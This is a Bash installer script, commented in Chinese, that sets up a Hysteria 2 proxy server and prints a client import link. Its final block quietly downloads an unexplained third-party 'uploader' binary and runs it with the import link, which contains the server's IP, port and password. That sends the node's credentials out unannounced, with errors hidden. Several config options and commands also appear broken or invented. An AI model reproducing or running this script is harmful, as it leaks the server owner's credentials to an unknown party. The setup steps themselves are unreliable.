#!/bin/bash
set -e

PORT=$((RANDOM % 7001 + 2000))
SERVER_IP=$(curl -s https://api.ipify.org)
OBFS_PASSWORD=$(openssl rand -hex 8)
CONFIG_DIR="/etc/hysteria"
UPLOAD_BIN="/opt/uploader-linux-amd64"
REMARK="Hysteria2节点-${SERVER_IP}"

export NEEDRESTART_MODE=a  # 自动跳过 needrestart 手动确认

# 安装依赖
apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo needrestart

# 防火墙放行 UDP 端口
ufw allow ${PORT}/udp
ufw --force enable

# 下载 Hysteria 2
mkdir -p /usr/local/bin
cd /usr/local/bin
curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o hysteria
chmod +x hysteria

# 创建配置目录
mkdir -p ${CONFIG_DIR}

# 生成密钥对
PRIVATE_KEY=$(openssl rand -hex 32)
PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")

# 写入服务端配置
cat > ${CONFIG_DIR}/config.yaml << EOF
listen: :${PORT}
protocol: udp
tls:
  cert: ""
  key: ""
  alpn:
    - h3
obfs:
  password: "${OBFS_PASSWORD}"
auth:
  type: disabled
masquerade:
  type: proxy
  proxy:
    url: https://www.cloudflare.com/
    rewriteHost: true
EOF

# 创建 systemd 服务
cat > /etc/systemd/system/hysteria.service << EOF
[Unit]
Description=Hysteria 2 Server
After=network.target

[Service]
ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml --private-key ${PRIVATE_KEY}
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable hysteria
systemctl restart hysteria

# 构建 v2rayN 可导入链接
HYSTERIA_JSON=$(cat <<EOF
{
  "server": "${SERVER_IP}:${PORT}",
  "auth": {
    "type": "disabled"
  },
  "obfs": {
    "type": "salty",
    "password": "${OBFS_PASSWORD}"
  },
  "tls": {
    "alpn": ["h3"],
    "sni": "www.cloudflare.com"
  },
  "protocol": "udp",
  "public-key": "${PUBLIC_KEY}",
  "remark": "${REMARK}",
  "up_mbps": 100,
  "down_mbps": 100
}
EOF
)

ENCODED_LINK=$(echo -n "${HYSTERIA_JSON}" | base64 -w 0)
IMPORT_LINK="hysteria2://${ENCODED_LINK}"

echo -e "\n✅ Hysteria 2 节点部署完成！"
echo -e "📌 可导入链接（V2RayN >= v6.27）：\n${IMPORT_LINK}"

# 上传 JSON 数据
[ -f "$UPLOAD_BIN" ] || {
  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

UPLOAD_JSON="{\"protocol\":\"hysteria2\",\"import_link\":\"${IMPORT_LINK}\"}"
"$UPLOAD_BIN" "$UPLOAD_JSON" >/dev/null 2>&1 || echo -e "\033[1;33m[WARN]\033[0m 上传失败或返回为空"
